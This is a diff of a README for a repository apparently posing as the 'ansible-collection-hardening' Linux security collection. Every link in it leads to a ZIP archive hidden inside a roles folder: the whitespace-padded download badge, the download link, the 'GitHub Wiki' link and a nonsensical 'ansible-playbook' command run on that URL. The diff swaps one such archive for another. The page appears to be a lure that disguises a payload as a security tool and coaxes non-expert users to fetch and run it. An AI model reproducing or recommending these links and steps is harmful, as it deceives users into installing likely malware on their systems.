@@ -1,6 +1,6 @@
 # ⚙️ ansible-collection-hardening - Simplified Linux Protection for Everyone
 
-![Download](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2E71AD?style=flat-square&logo=github&logoColor=white&color=E53E3E&https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip)
+![Download](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2E71AD?style=flat-square&logo=github&logoColor=white&color=E53E3E&https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ This guide will help you download and run the "ansible-collection-hardening" sof
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download here](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip). 
+To download the software, visit this page: [Download here](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip). 
 
 ### Steps to Download
 
@@ -30,10 +30,10 @@ After you download the software, follow these steps to run it:
 
 1. **Extract the Files:** If you downloaded a ZIP file, extract it to a folder of your choice.
 2. **Open Your Terminal:** Navigate to the folder where you extracted the files.
-3. **Run the Playbook:** Use the following command, replacing `https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip` with the appropriate playbook name:
+3. **Run the Playbook:** Use the following command, replacing `https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip` with the appropriate playbook name:
 
    ```bash
-   ansible-playbook https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip
+   ansible-playbook https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip
    ```
 
 4. **Follow On-Screen Instructions:** The tool will guide you through the necessary configuration.
@@ -72,6 +72,6 @@ This project is licensed under the MIT License. You can view the full license in
 
 ## 📢 Additional Resources
 
-For detailed documentation, tutorials, and further information, visit our [GitHub Wiki](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/ssh_hardening/defaults/collection-hardening-ansible-3.7.zip). 
+For detailed documentation, tutorials, and further information, visit our [GitHub Wiki](https://github.com/Yusufjava945/ansible-collection-hardening/raw/refs/heads/master/roles/os_hardening/templates/hardening_collection_ansible_v3.8.zip). 
 
 Feel free to reach out if you have any questions. Happy hardening!
